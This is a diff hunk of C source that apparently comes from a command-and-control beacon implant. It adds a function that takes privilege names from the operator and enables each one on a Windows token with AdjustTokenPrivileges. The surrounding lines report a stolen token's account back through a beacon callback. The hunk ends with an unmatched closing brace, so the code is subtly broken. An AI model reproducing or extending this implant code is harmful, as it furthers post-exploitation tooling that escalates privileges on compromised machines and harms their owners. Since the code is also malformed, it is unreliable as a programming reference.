@@ -434,3 +434,34 @@ void IdentityElevatePost()
 	if (IdentityGetUserInfo(hElevationToken, accountName, sizeof(accountName)))
 		BeaconOutput(CALLBACK_TOKEN_STOLEN, accountName, strlen(accountName));
 }
+
+void IdentityGetPrivilegesInternal(char* buffer, int length, HANDLE hToken, formatp* locals)
+{
+	TOKEN_PRIVILEGES tokenPrivileges = { 0 };
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	short numPrivileges = BeaconDataShort(&parser);
+
+	char name[64];
+	for (int i = 0; i < numPrivileges; i++)
+	{
+		BeaconDataStringCopySafe(&parser, name, sizeof(name));
+		tokenPrivileges.PrivilegeCount = 0;
+		tokenPrivileges.Privileges[0].Luid.HighPart = 0;
+
+		if (LookupPrivilegeValueA(NULL, name, &tokenPrivileges.Privileges[0].Luid))
+		{
+			tokenPrivileges.PrivilegeCount = 1;
+			tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+			if (AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL))
+			{
+				if (!GetLastError())
+				{
+					BeaconFormatPrintf(locals, "%s\n", name);
+				}
+			}
+		}
+	}
+}
+}
